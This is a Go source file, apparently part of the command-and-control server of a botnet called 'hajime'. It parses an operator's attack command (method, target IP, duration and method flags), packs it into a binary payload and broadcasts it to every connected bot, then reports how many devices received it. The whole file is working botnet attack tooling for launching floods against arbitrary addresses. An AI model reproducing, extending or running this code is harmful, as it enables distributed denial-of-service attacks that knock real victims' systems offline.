package views

import (
	"bytes"
	"encoding/binary"
	"hajime/source"
	"hajime/source/masters/sessions"
	"net"
	"regexp"
	"strconv"
	"strings"

	"golang.org/x/exp/slices"
)

// AttackPage will handle the attack request by parsing the values
func AttackPage(session *sessions.Session, args []string, method *source.Attack) error {
	if len(args) <= 2 {
		_, err := session.Term.Println("Syntax: <method> <target> <duration>")
		return err
	}

	target := net.ParseIP(args[1])
	if target == nil {
		_, err := session.Term.Println("Please supply a legitimate IPv4 or IPv6 address.")
		return err
	}

	duration, err := strconv.Atoi(args[2])
	if err != nil || duration <= 0 {
		_, err := session.Term.Println("The provided duration is not valid.")
		return err
	}

	payload := make([]byte, 6)

	/* appends the method id, target length and target */
	binary.BigEndian.PutUint16(payload, uint16(method.MethodID))
	binary.BigEndian.PutUint16(payload[2:], uint16(duration))
	binary.BigEndian.PutUint16(payload[4:], uint16(len(target)))
	payload = append(payload, target...)

	// asks for help on flags
	if slices.Contains(args[3:], "?") {
		buf := bytes.NewBuffer(make([]byte, 0))
		for _, id := range method.Flags {
			flag := source.GetFlagID(id)
			if flag == nil {
				continue
			}

			payload, err := session.ExecuteBrandingToString(map[string]any{"flag": flag.Name, "description": flag.Description}, "resources", "branding", "flag.tfx")
			if err != nil {
				return err
			}

			buf.WriteString(payload)
		}

		_, err := buf.WriteTo(session.Term)
		return err
	}

	// ranges through all the flag fields provided
	for _, flag := range args[3:] {
		sections := strings.Split(flag, "=")
		if len(sections) <= 1 {
			_, err := session.Term.Println("Usage: <method> <target> <duration> <flag_name>=<flag_value>")
			return err
		}

		data, ok := source.Flags[strings.ToLower(sections[0])]
		if !ok || !slices.Contains(method.Flags, data.ID) {
			_, err := session.Term.Println("Invalid or incompatible flag used with this method.")
			return err
		}

		if ok, err := regexp.MatchString(data.Regexp, strings.Join(sections[1:], "=")); err != nil || !ok {
			_, err := session.Term.Println("The format for this flag is incorrect.")
			return err
		}

		// builds the payload for the flag and then appends it
		buf := make([]byte, 4)
		binary.BigEndian.PutUint16(buf, uint16(data.ID))
		binary.BigEndian.PutUint16(buf[2:], uint16(len([]byte(strings.Join(sections[1:], "=")))))
		payload = append(payload, append(buf, []byte(strings.Join(sections[1:], "="))...)...)
	}

	// Broadcast will write the payload to all the devices
	recvs := source.Broadcast(payload, -1)

	return session.ExecuteBranding(map[string]any{"sent_too": recvs}, "resources", "branding", "attack_sent.tfx")
}